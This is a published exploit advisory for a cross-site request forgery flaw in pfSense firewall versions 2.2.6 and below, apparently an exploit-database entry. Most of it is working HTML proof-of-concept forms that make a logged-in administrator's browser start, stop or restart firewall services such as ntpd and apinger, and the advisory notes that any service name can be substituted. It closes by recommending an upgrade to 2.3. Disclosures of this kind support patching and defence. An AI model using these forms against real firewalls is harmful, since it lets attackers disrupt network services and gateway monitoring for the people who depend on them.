@@ -1,0 +1,77 @@
+# Exploit Title: pfSense Firewall <= 2.2.6 Cross-Site Request Forgery 
+# Exploit Author: Aatif Shahdad
+# Software Link: http://files.nyi.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.5-RELEASE-i386.iso.gz
+# Version: 2.2.6 and below.
+# Contact: https://twitter.com/61617469665f736
+# Category: webapps
+
+
+1. Description
+
+An attacker can coerce a logged-in victim's browser to issue requests that will start/stop/restart services on the Firewall. 
+
+
+2. Proof of Concept
+
+Login to the Web Console, for example, http://192.168.0.1 (set at the time of install) and  open the following POC’s:
+
+
+Start NTPD service:
+
+<html>
+ <body>
+   <form action="https://192.168.0.1/status_services.php">
+     <input type="hidden" name="mode" value="startservice" />
+     <input type="hidden" name="service" value="ntpd" />
+     <input type="submit" value="Submit request" />
+   </form>
+ </body>
+</html>
+
+
+Stop NTPD service:
+
+<html>
+ <body>
+   <form action="https://192.168.0.1/status_services.php">
+     <input type="hidden" name="mode" value="stopservice" />
+     <input type="hidden" name="service" value="ntpd" />
+     <input type="submit" value="Submit request" />
+   </form>
+ </body>
+</html>
+
+
+
+Restart NTPD service:
+
+POC:
+<html>
+ <body>
+   <form action="https://192.168.0.1/status_services.php">
+     <input type="hidden" name="mode" value="restartservice" />
+     <input type="hidden" name="service" value="ntpd" />
+     <input type="submit" value="Submit request" />
+   </form>
+ </body>
+</html>
+
+The service will automatically start/stop. 
+
+Note: That NTPD service can be replaced with any service running on the Firewall. For example, to stop the APINGER (gateway monitoring daemon) service, use the following POC:
+
+<html>
+ <body>
+   <form action="https://192.168.0.1/status_services.php">
+     <input type="hidden" name="mode" value="stopservice" />
+     <input type="hidden" name="service" value="apinger" />
+     <input type="submit" value="Submit request" />
+   </form>
+ </body>
+</html>
+
+
+
+3. Solution:
+
+Upgrade to version 2.3 at https://www.pfsense.org/download/mirror.php?section=downloads
